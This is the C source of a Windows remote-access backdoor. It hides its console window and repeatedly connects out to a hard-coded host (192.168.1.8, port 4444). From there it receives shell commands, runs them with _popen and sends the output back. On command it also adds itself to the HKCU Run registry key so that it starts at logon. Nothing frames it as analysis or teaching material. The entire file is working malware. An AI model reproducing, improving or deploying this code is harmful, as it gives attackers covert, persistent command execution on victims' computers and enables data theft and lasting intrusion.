#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

int bootRun()
{
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("cyka"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

char *str_cut(char str[], int slice_from, int slice_to)
{
    if (str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    int bytes_received;

    while (1) {
        bytes_received = recv(sock, buffer, 1, MSG_PEEK);
        if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
            printf("trying connect...\n");
            closesocket(sock);
            
            struct sockaddr_in ServAddr;
            WSADATA wsaData;
            
            WSAStartup(MAKEWORD(2,0), &wsaData);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            
            memset(&ServAddr, 0, sizeof(ServAddr));
            ServAddr.sin_family = AF_INET;
            ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
            ServAddr.sin_port = htons(4444);
            
            while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                Sleep(10000);
            }
            
            printf("reconected!\n");
            continue;
        }

        bzero(buffer,1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        
        bytes_received = recv(sock, buffer, 1024, 0);
        if (bytes_received <= 0) {
            closesocket(sock);
            struct sockaddr_in ServAddr;
            WSADATA wsaData;
            
            WSAStartup(MAKEWORD(2,0), &wsaData);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            
            memset(&ServAddr, 0, sizeof(ServAddr));
            ServAddr.sin_family = AF_INET;
            ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
            ServAddr.sin_port = htons(4444);
            
            while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                Sleep(10000);
            }
            continue;
        }

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer,3,100));
        }
        else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container,1024,fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        
        memset(&ServAddr, 0, sizeof(ServAddr));
        ServAddr.sin_family = AF_INET;
        ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
        ServAddr.sin_port = htons(4444);

        while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
            Sleep(10000);
        }

        Shell();
        
        closesocket(sock);
        Sleep(10000);
    }

    WSACleanup();
    return 0;
}